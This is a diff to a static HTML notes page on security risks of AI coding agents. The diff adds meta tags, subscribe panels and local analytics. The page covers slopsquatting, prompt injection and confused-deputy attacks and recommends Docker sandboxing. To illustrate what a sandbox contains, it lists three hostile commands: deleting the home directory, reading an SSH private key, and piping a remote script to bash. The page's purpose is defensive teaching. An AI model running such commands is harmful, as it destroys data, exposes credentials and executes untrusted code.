@@ -4,7 +4,27 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Security Issues · Computer Science Notes</title>
+
+    <meta name="description" content="Agents, feedback loops, and implementation habits." />
+    <link rel="canonical" href="https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/" />
+    <meta property="og:title" content="Security Issues · Computer Science Notes" />
+    <meta property="og:description" content="Agents, feedback loops, and implementation habits." />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/" />
+    <meta property="og:site_name" content="Computer Science Notes" />
+    <meta property="og:image" content="https://notes.praneeth-suresh-s.workers.dev/assets/social/theoretical-cs-preview.svg" />
+    <meta property="og:image:type" content="image/svg+xml" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:image:alt" content="Theoretical CS, from intuition to proof." />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Security Issues · Computer Science Notes" />
+    <meta name="twitter:description" content="Agents, feedback loops, and implementation habits." />
+    <meta name="twitter:image" content="https://notes.praneeth-suresh-s.workers.dev/assets/social/theoretical-cs-preview.svg" />
+    <meta name="twitter:image:alt" content="Theoretical CS, from intuition to proof." />
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://notes.praneeth-suresh-s.workers.dev/"},{"@type":"ListItem","position":2,"name":"Agentic Coding","item":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/"},{"@type":"ListItem","position":3,"name":"Security Issues","item":"https://notes.praneeth-suresh-s.workers.dev/topics/agent-coding/security-issues/"}]}</script>
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ctext y='14' font-size='14'%3ECS%3C/text%3E%3C/svg%3E" />
+    <link rel="alternate" type="application/rss+xml" title="Computer Science Notes RSS" href="/feed.xml" />
     <link rel="stylesheet" href="/assets/site.css" />
     <script>
       window.MathJax = {
@@ -20,15 +40,17 @@
     </script>
     <script defer src="/assets/vendor/mathjax/tex-svg-full.js"></script>
   </head>
-  <body>
+  <body data-analytics-event="page_view">
     <a class="skip-link" href="#main-content">Skip to content</a>
     <main class="layout">
       <header class="site-header">
         <a class="brand-link" href="/" data-hotkey="H">Computer Science Notes</a>
         <nav class="site-links" aria-label="Site navigation">
+          <a href="/start-here/">Start</a>
           <a href="/about/" data-hotkey="P">Portfolio</a>
           <a href="/#main-content" data-hotkey="N">Notes</a>
           <a href="/blog/" data-hotkey="B">Blog</a>
+          <a href="/feed.xml" data-hotkey="R" data-analytics-event="rss_click" data-subscribe-source="header">RSS</a>
         </nav>
       </header>
       
@@ -38,6 +60,20 @@
       <p class="topic-parent">Subpage of Agentic Coding</p>
       
       <p class="topic-meta">Agents, feedback loops, and implementation habits.</p>
+      
+      
+    <section id="subscribe-topic-subpage-top" class="subscribe-panel subscribe-panel-compact" aria-labelledby="subscribe-title-topic-subpage-top">
+      <div>
+        <p class="section-kicker">/ Subscribe</p>
+        <h2 id="subscribe-title-topic-subpage-top">Get the monthly deep dive.</h2>
+        <p>One rigorous theoretical CS deep dive every 3-4 weeks, with intuition, formal models, proof sketches, and implementation tradeoffs in one place.</p>
+      </div>
+      <div class="subscribe-actions" aria-label="Subscription actions">
+        <a class="primary-action" href="/subscribe/" data-analytics-event="newsletter_cta_click" data-subscribe-source="topic-subpage-top">Get the monthly deep dive</a>
+        <a class="secondary-action" href="/feed.xml" data-analytics-event="rss_click" data-subscribe-source="topic-subpage-top">Subscribe by RSS</a>
+      </div>
+    </section>
+  
       <article class="note-article notion-page-content"><p class="notion-block notion-paragraph" data-notion-block-id="363d3a21-bb2d-800b-8d42-ed9f82c94785">The following are potential ways in which AI agents can be exploited:</p><ol class="notion-block notion-numbered-list note-list"><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-805e-9e8a-dbd4b223bb2d">Slop Squatting: Models can hallucinate names, such as package names, leading to a possibility for malicious code to get injected.</li><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-8047-9e80-df522f37de07">Prompt Injection: This involves hiding malicious instructions inside files/pages that AI would read.</li><li class="notion-block notion-list-item note-list-item" data-notion-block-id="363d3a21-bb2d-8072-bf98-e874116801ee">Confused Deputy: This is related to prompt injection as a technique where an attacker gains escalated privilege and performs unintended actions.</li></ol><p class="notion-block notion-paragraph" data-notion-block-id="363d3a21-bb2d-80f5-9551-f9fa634ffffe">For all of these reasons, it is important to ensure that the agent is sandboxed: it needs its own execution environment with everything it needs to work but nothing more.</p><h1 class="notion-block notion-heading notion-heading-1" data-notion-block-id="364d3a21-bb2d-80f3-a37f-e0a2336b678b">Fix 1: Sandboxes</h1><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-806b-99fe-c6cdea9727ca">Local sandboxes are a <strong>damage-limiting layer</strong> for AI coding agents. They let the agent run commands, install packages, edit files, and test code inside a constrained environment instead of directly on your host OS.</p><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-801a-99dc-d4e18cfb7faa">Docker containers isolate filesystem, networking, and process trees from the host by default, but bind mounts can still let container processes modify host files, so mount only the project directory and prefer read-only mounts where possible. (<a href="https://docs.docker.com/engine/containers/run/?utm_source=chatgpt.com" rel="noreferrer noopener">Docker Documentation</a>)</p><h2 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-8070-8b32-f022f2da8ff8">Basic setup</h2><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80b9-abb9-c32da1ac8bdb">Create a project-specific container:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-80c4-bda8-c2c3de2eae54"><pre class="note-code-block" data-language="bash"><code class="language-bash">mkdir my-project
 cd my-project</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8021-9276-f8768487316a">Add a <code class="note-inline-code">Dockerfile</code>:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-804b-af40-f15a50c57efb"><pre class="note-code-block" data-language="plain-text"><code class="language-plain-text">FROM node:22-bookworm
 
@@ -72,11 +108,67 @@ pytest
 go test ./...</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80a7-bd83-cae0198ed979">Commit only after inspection.</p><h2 class="notion-block notion-heading notion-heading-2" data-notion-block-id="364d3a21-bb2d-80fa-a3fa-c169937baa01">What this protects against</h2><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-80bb-9d9c-cdfe34073243">A sandbox helps contain bad commands like:</p><figure class="notion-block notion-code" data-notion-block-id="364d3a21-bb2d-801f-a241-c7f6c9f40fed"><pre class="note-code-block" data-language="bash"><code class="language-bash">rm -rf ~
 cat ~/.ssh/id_rsa
 curl malicious-script | bash</code></pre></figure><p class="notion-block notion-paragraph" data-notion-block-id="364d3a21-bb2d-8004-a662-d7763c1e0452">But it is not perfect. If you mount sensitive host directories, expose Docker’s socket, run privileged containers, or give the agent real credentials, the sandbox can be bypassed in practice.</p></article>
+      <nav class="next-reading" aria-label="Next reading">
+  <p class="section-kicker">/ Next</p>
+  <a class="next-reading-link" href="/topics/agent-coding/prompting-basics/">
+    <span>Next reading</span>
+    <strong>Prompting Basics</strong>
+    <p>Continue inside Agentic Coding</p>
+  </a>
+</nav>
+      
+    <section id="subscribe-topic-subpage" class="subscribe-panel" aria-labelledby="subscribe-title-topic-subpage">
+      <div>
+        <p class="section-kicker">/ Subscribe</p>
+        <h2 id="subscribe-title-topic-subpage">Get the monthly deep dive.</h2>
+        <p>One rigorous theoretical CS deep dive every 3-4 weeks, with intuition, formal models, proof sketches, and implementation tradeoffs in one place.</p>
+      </div>
+      <div class="subscribe-actions" aria-label="Subscription actions">
+        <a class="primary-action" href="/subscribe/" data-analytics-event="newsletter_cta_click" data-subscribe-source="topic-subpage">Get the monthly deep dive</a>
+        <a class="secondary-action" href="/feed.xml" data-analytics-event="rss_click" data-subscribe-source="topic-subpage">Subscribe by RSS</a>
+      </div>
     </section>
+  
+    </section>
+  
+      
+      <footer class="site-footer" aria-label="Site footer">
+        <div>
+          <p class="section-kicker">/ Discovery</p>
+          <p>Static notes, RSS, and source trails for rigorous computer science reading.</p>
+        </div>
+        <nav class="footer-links" aria-label="Footer navigation">
+          <a href="/start-here/">Start</a>
+          <a href="/research-taste/">Research taste</a>
+          <a href="/#main-content">Notes</a>
+          <a href="/blog/">Blog</a>
+          <a href="/about/">Portfolio</a>
+          <a href="/errata/">Errata</a>
+          <a href="/subscribe/">Subscribe</a>
+          <a href="/feed.xml" data-analytics-event="rss_click" data-subscribe-source="footer">RSS</a>
+          <a href="/sitemap.xml">Sitemap</a>
+        </nav>
+      </footer>
   
     </main>
     <script>
       (() => {
+        window.notesAnalyticsEvents = window.notesAnalyticsEvents || [];
+
+        function recordAnalyticsEvent(name, detail = {}) {
+          const payload = {
+            name,
+            path: window.location.pathname,
+            detail,
+            recordedAt: new Date().toISOString(),
+          };
+          window.notesAnalyticsEvents.push(payload);
+          window.dispatchEvent(new CustomEvent("notes-analytics", { detail: payload }));
+        }
+
+        document.body.dataset.analyticsEvent = "page_view";
+        recordAnalyticsEvent("page_view");
+
         function isEditableTarget(target) {
           if (!target || !(target instanceof HTMLElement)) {
             return false;
@@ -120,6 +212,20 @@ curl malicious-script | bash</code></pre></figure><p class="notion-block notion-
             event.preventDefault();
             target.click();
           }
+        });
+
+        document.addEventListener("click", (event) => {
+          const target = event.target instanceof Element
+            ? event.target.closest("[data-analytics-event]")
+            : null;
+          if (!target) {
+            return;
+          }
+
+          recordAnalyticsEvent(target.dataset.analyticsEvent, {
+            href: target.getAttribute("href") || "",
+            subscribeSource: target.dataset.subscribeSource || "",
+          });
         });
       })();
     </script>
